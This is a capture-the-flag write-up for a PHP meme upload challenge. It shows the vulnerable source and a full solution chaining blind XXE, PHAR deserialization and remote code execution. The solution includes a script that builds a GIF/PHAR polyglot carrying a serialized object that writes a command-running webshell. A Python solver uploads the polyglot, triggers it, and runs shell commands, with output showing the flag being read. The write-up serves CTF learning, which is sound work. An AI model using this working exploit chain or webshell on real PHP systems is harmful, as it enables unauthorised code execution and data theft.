# MEME UPLOAD SERVICE [HARD]

## Description

> We are working on a meme upload and messaging service. The service only allows users to upload images and currently only writes messages to a local directory. Can you find any bugs before we enable outbound Internet access and functionality to send the messages?

## Source Code

<details><summary>Click here for source code in text format</summary>

index.php

```php
<?php

class Message
{
    public function __construct($to, $from, $image)
    {
        $this->to = $to;
        $this->from = $from;
        $this->image = $image;
        $this->filePath = tempnam("/tmp/messages/", "") . ".txt"; // TODO: send messages
    }

    public function __destruct()
    {
        file_put_contents($this->filePath, sprintf(
            "Hey %s! Take a look at this meme: %s! - %s",
            $this->to,
            $this->from,
            $this->image,
        ));
    }
}

if (isset($_POST["message"])) {
    $msgXml = new DOMDocument();
    $msgXml->loadXML($_POST["message"], LIBXML_DTDLOAD);
    if ($msgXml->schemaValidate("valid_message.xsd")) {
        $msgObj = new Message(
            $msgXml->getElementsByTagName("to")[0]->nodeValue,
            $msgXml->getElementsByTagName("from")[0]->nodeValue,
            $msgXml->getElementsByTagName("image")[0]->nodeValue
        );
        echo sprintf(
            "Message stored %s!",
            $msgObj->filePath
        );
    } else {
        echo "Invalid XML!";
    }
} else if (isset($_FILES["image"])) {
    $imageTmp = $_FILES["image"]["tmp_name"];
    $imageSize = $_FILES["image"]["size"];
    $imageExt = strtolower(pathinfo($_FILES["image"]["name"], PATHINFO_EXTENSION));
    $imageMime = mime_content_type($imageTmp);
    $allowedExt = array("jpg", "jpeg", "gif", "png");
    $allowedMime = array("image/jpeg", "image/gif", "image/png");
    if (in_array($imageExt, $allowedExt) === false)
        die("Invalid extension!");
    if (in_array($imageMime, $allowedMime) === false)
        die("Invalid mime type!");
    if (getimagesize($imageTmp) === false || $imageSize > 185)
        die("Invalid size!");
    $uploadPath = tempnam("/tmp/images/", "") . "." . $imageExt;
    move_uploaded_file($imageTmp, $uploadPath);
    echo sprintf(
        "Image uploaded %s!",
        $uploadPath
    );
} else {
    echo highlight_file(__FILE__, true);
}
```

valid_message.xsd

```xml
<xs:schema attributeFormDefault="unqualified" elementFormDefault="qualified" xmlns:xs="http://www.w3.org/2001/XMLSchema">
<xs:element name="message">
  <xs:complexType>
    <xs:sequence>
      <xs:element name="to" minOccurs="1" maxOccurs="1"/>
      <xs:element name="from" minOccurs="1" maxOccurs="1"/>
      <xs:element name="image" minOccurs="1" maxOccurs="1"/>
    </xs:sequence>
  </xs:complexType>
</xs:element>
</xs:schema>
```

</details>

## Short Solution Description / Tags

Blind XXE, Phar Deserialization, RCE

## Soution

create_phar.php

```php
<?php

class Message {};

$obj = new Message;
$obj->to = '<?=`$_GET[0]`?>';
$obj->filePath = "a.php";

$phar = new Phar("tmp.phar");

// ref: https://www.php.net/manual/en/phar.setsignaturealgorithm.php
// There is a need to use MD5 or SHA1 algorithm so that Phar file size is not over 185 bytes.
$phar->setSignatureAlgorithm(Phar::MD5);
$phar->startBuffering();
$phar->setStub("GIF8<?php __HALT_COMPILER();");
// $phar->setStub("GIF8__HALT_COMPILER();");  this works also
$phar->setMetadata($obj);

// dummy file
$phar->addFromString('a', '');
$phar->stopBuffering();

$f = fopen('tmp.phar', 'r') or dir('Unable to open file.');
echo fread($f, filesize('tmp.phar'));
fclose($f);

@unlink("tmp.phar");

// echo $phar->getVersion() . PHP_EOL;
// var_dump($phar->getSignature());
```

Checking Phar:

```console
$ php create_phar.php | hd
00000000  47 49 46 38 3c 3f 70 68  70 20 5f 5f 48 41 4c 54  |GIF8<?php __HALT|
00000010  5f 43 4f 4d 50 49 4c 45  52 28 29 3b 20 3f 3e 0d  |_COMPILER(); ?>.|
00000020  0a 7c 00 00 00 01 00 00  00 11 00 00 00 01 00 00  |.|..............|
00000030  00 00 00 4d 00 00 00 4f  3a 37 3a 22 4d 65 73 73  |...M...O:7:"Mess|
00000040  61 67 65 22 3a 32 3a 7b  73 3a 32 3a 22 74 6f 22  |age":2:{s:2:"to"|
00000050  3b 73 3a 31 35 3a 22 3c  3f 3d 60 24 5f 47 45 54  |;s:15:"<?=`$_GET|
00000060  5b 30 5d 60 3f 3e 22 3b  73 3a 38 3a 22 66 69 6c  |[0]`?>";s:8:"fil|
00000070  65 50 61 74 68 22 3b 73  3a 35 3a 22 61 2e 70 68  |ePath";s:5:"a.ph|
00000080  70 22 3b 7d 01 00 00 00  61 00 00 00 00 00 00 00  |p";}....a.......|
00000090  00 00 00 00 00 00 00 00  00 a4 01 00 00 00 00 00  |................|
000000a0  00 5a f9 51 93 f4 d3 57  72 82 d9 39 3b 3a ce f8  |.Z.Q...Wr..9;:..|
000000b0  31 01 00 00 00 47 42 4d  42                       |1....GBMB|
000000b9

$ php create_phar.php | wc -c
185
```

solver.py

```python
import re
import subprocess
import sys
import requests

requests.packages.urllib3.disable_warnings()
s = requests.Session()
# s.proxies = {"https": "http://127.0.0.1:8080"}
s.verify = False

BASE_URL = "https://f2237915c2c268b3.247ctf.com"

# payload:
# https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages
# https://swisskyrepo.github.io/PayloadsAllTheThings/XXE%20Injection/#basic-blind-xxe


XML_PAYLOAD = """\
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "phar://{path}"> %xxe;]>
<message>
  <to>a</to>
  <from>b</from>
  <image>c</image>
</message>
"""


def main():
    # upload phar and create a.php webshell
    if len(sys.argv) != 2:
        p = subprocess.run(["php", "create_phar.php"], capture_output=True, check=True)
        phar = p.stdout
        assert len(phar) <= 185

        # upload phar
        r = s.post(
            BASE_URL,
            files={"image": ("test.gif", phar, "image/gif")},
        )
        m = re.findall(r"Image uploaded (.*?)!", r.text)
        assert m, "Failed to upload image"
        image_path = m[0]

        # upload xml
        r = s.post(BASE_URL, data={"message": XML_PAYLOAD.format(path=image_path)})
        assert "Message stored" in r.text, "Failed to upload XML"

    else:
        cmd = sys.argv[1]
        r = s.get(f"{BASE_URL}/a.php", params={"0": cmd})
        m = re.findall(r"Hey (.*)! Take", r.text, re.MULTILINE | re.DOTALL)
        assert m

        print(m[0])


if __name__ == "__main__":
    main()
```

Result:

```console
$ python3 solver.py  # upload phar

$ python3 solver.py 'ls -la /tmp'  # command execution
total 4
drwxrwxrwt 1 root     root     36 Dec 29 08:11 .
drwxr-xr-x 1 root     root     39 Dec 29 07:43 ..
-rw-rw-r-- 1 root     root     41 Apr 14  2021 flag_0073c38db2a4d3c1.txt
drwxr-xr-x 1 www-data www-data 70 Dec 29 08:11 images
drwxr-xr-x 1 www-data www-data 70 Dec 29 08:11 messages


$ python3 solver.py 'cat /tmp/flag_0073c38db2a4d3c1.txt'
247CTF{[REDACTED]}
```

## References

- [Polyglot Files: A Hacker’s Best Friend - Vickie Li’s Security Blog](https://vickieli.dev/hacking/polyglot/)
- [phar:// deserialization - HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion/phar-deserialization)
- [\[2020巅峰极客\]easyphp2](https://yyz9.cn/2020/10/11/2020%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2easyphp2/)
- [PHAR deserialization](https://portswigger.net/web-security/deserialization/exploiting#phar-deserialization)
